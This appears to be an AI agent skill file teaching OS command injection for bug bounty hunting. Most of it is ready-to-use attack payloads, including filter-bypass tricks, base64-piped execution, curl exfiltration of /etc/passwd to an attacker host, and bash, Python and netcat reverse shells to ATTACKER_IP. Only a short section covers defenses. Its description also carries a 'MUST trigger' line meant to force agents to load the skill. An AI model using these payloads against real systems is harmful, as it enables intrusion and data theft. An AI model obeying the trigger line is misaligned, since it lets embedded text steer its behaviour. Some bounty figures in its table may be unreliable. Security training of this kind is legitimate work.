---
name: command-injection-os-level
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit OS Command Injection vulnerabilities where web applications insecurely pass
  user input into system shell commands. Use this skill when applications feature ping utilities,
  file conversions, network diagnostics, or PDF generators to execute arbitrary system commands
  and achieve Remote Code Execution (RCE).
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0002]
  techniques: [T1059.004, T1190]
platforms: [linux, windows]
tags: [command-injection, rce, os-injection, blind-injection, bug-hunting, shell]
tools: [burpsuite, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# OS Command Injection

## When to Use
- When an application exposes functionality that typically relies on underlying OS binaries (e.g., `ping`, `nslookup`, `traceroute`, `ffmpeg`, `pdfgen`).
- When input parameters seem to be interacting directly with the filesystem or networked services (e.g., `?ip=127.0.0.1` or `?folder=/tmp`).
- To escalate blind or visible reflection bugs into complete, system-level Remote Code Execution (RCE).


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Injection Detection (Visible Response)

```text
# Concept: If the developer executes `ping -c 3 $USER_INPUT`, we can use shell 
# metacharacters to string together our own commands.

# Common Metacharacters:
;    (Command separator - Linux)
|    (Piping - Linux/Windows)
||   (OR operator - executes second if first fails)
&&   (AND operator - executes second if first succeeds)
`cmd` or $(cmd) (Command Substitution)
%0a  (Newline character / URL Encoded)

# 1. Basic Probing
# If the intended input is 127.0.0.1:
?ip=127.0.0.1;id
?ip=127.0.0.1|whoami
?ip=127.0.0.1||whoami
?ip=127.0.0.1%0awhoami
?ip=$(whoami)

# 2. Analyze Output
# If the response includes `uid=1000(www-data) gid=1000(www-data)`, it is definitively vulnerable to Command Injection.
```

### Phase 2: Bypassing Filters & Restrictions

```text
# Concept: WAFs or developers may try to filter spaces, slashes, or specific words (like `cat` or `flag`).

# 1. Bypassing Space Filters
# Use Input Field Separators (IFS), brace expansion, or redirection.
;cat<target.txt            # Redirection instead of space
;cat${IFS}target.txt       # Uses Internal Field Separator
;{cat,target.txt}          # Brace expansion

# 2. Bypassing Blacklisted Commands (e.g., 'cat' or 'whoami' blocked)
# Use quotes, slash injection, or wildcards to break up the word.
w'h'o'a'm'i
w"h"o"a"m"i
wh$@oami
/b?n/?at /e*c/pas*wd       # Wildcard execution targeting /bin/cat /etc/passwd

# 3. Encoding Bypasses
# Send commands encoded in Base64 and decode them on the fly.
;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

### Phase 3: Blind Command Injection (Time-Based)

```text
# Concept: The command executes on the server, but the web page does not display the output.

# 1. Time Delay Payloads
# Force the server to wait. If the page takes 10 seconds to load, you proved execution.
?ip=127.0.0.1;sleep 10
?ip=127.0.0.1|ping -c 10 127.0.0.1

# 2. Why it matters:
# Although you can't see the output, you can now infer data or initiate OOB exfiltration.
```

### Phase 4: Blind Command Injection (Out-Of-Band OOB)

```text
# Concept: Send the execution results to a server you control (like Burp Collaborator or a VPS)
# via DNS or HTTP requests.

# 1. DNS Exfiltration (Best for restricted egress networks)
# The server will resolve `whoami.attacker.com`, allowing you to see the username in DNS logs.
;nslookup `whoami`.attacker-controlled-domain.com

# 2. HTTP Exfiltration (Using curl/wget)
;curl http://attacker.com/log?data=$(cat /etc/passwd | base64 -w 0)

# 3. Upgrading to a Reverse Shell
# If you have RCE, establish a persistent connection back to your machine.
;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Inject `;id` into parameter] --> B{Visible Output?}
    B -->|Yes| C[Visible Injection: Read Files & Exploit]
    B -->|No| D[Inject `;sleep 10`]
    D --> E{Does page delay?}
    E -->|Yes| F[Blind Injection: Exfiltrate via OOB DNS/HTTP]
    E -->|No| G[Try alternative separators /||/&&/%0a]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Avoid OS Commands**: The best defense is to never call OS commands from application code. Use native programming language APIs instead (e.g., instead of calling `ping` in Bash, use a Ruby/Python socket library).
- **Strict Parameterization**: If calling OS processes is unavoidable, use secure APIs that do not invoke a shell wrapper. 
  - Python: Use `subprocess.run(["ping", "-c", "3", user_input])` rather than `os.system("ping " + user_input)` which spawns a vulnerable shell.
- **Input Sanitization**: Strictly whitelist input format (e.g., regex `^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$` for IP addresses).
- **EDR Monitoring**: Alert on web server processes (Apache/nginx/tomcat) spawning suspicious child processes (`/bin/sh`, `cmd.exe`, `curl`, `nc`).

## Key Concepts
| Concept | Description |
|---------|-------------|
| Command Injection | Exploiting an application that constructs a system shell command using untrusted user input |
| Shell Metacharacters | Characters like `;`, `|`, `&` that hold special meaning to the command line interpreter, allowing multiple commands to run |
| Blind RCE | Code execution where the output is not returned to the attacker's HTTP response, requiring indirect validation (time or out-of-band) |
| IFS | Internal Field Separator; a shell variable determining how strings are split. Extremely useful for bypassing space filters |

## Output Format
```
Bug Bounty Report: Command Injection in Diagnostic Tool
=======================================================
Vulnerability: OS Command Injection (Remote Code Execution)
Severity: Critical (CVSS 10.0)
Endpoint: POST /admin/network/ping

Description:
The "Ping Utility" feature passes the `target_ip` parameter directly into an unsanitized `os.system()` call on the backend server. By appending shell metacharacters, an attacker can execute arbitrary commands on the underlying Linux operating system.

Reproduction Steps:
1. Authenticate to the admin dashboard and navigate to the Ping Utility.
2. Submit the following payload in the IP field: `127.0.0.1; whoami`
3. The server response includes the output of the ping command, followed by `root`.
4. Submit reverse shell payload: `127.0.0.1; nc -e /bin/sh 10.0.0.5 4444`

Impact:
Critical. The attacker achieves unauthenticated Remote Code Execution running as `root`, leading to complete server compromise, database exfiltration, and lateral movement within the AWS VPC.
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (RCE / Pwn2Own)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Google Chrome** | $250,000 | Micky | CVE-2025-4609: Chrome Mojo IPC sandbox escape → system commands | 2025 |
| **Google Chrome** | $100,115 | (Undisclosed) | MiraclePtr Bypass — highest single Chrome payout in 2024 | 2024 |
| **Chrome+Safari+IE11** | $225,000 | lokihardt (Jung Hoon Lee) | Pwn2Own: Took down all 3 browsers via OS-level sandbox escapes | 2023 |
| **Chrome** | $60,000 | Pinkie Pie | Chrome sandbox escape via WebKit + Windows kernel flaws | 2023 |
| **Zoom** | (Pwn2Own) | Daan Keuper, Thijs Alkemade | Zero-click remote exploit on Zoom Messenger | 2023 |

**Key Lesson**: Google paid $250K for a single Chrome bug (CVE-2025-4609) — the highest ever.
It was a sandbox escape via Mojo IPC that let a compromised renderer execute system commands.
Pwn2Own contestants earn $50K-$225K per browser exploit.

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- OWASP: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- PortSwigger: [OS command injection](https://portswigger.net/web-security/os-command-injection)
- PayloadsAllTheThings: [Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
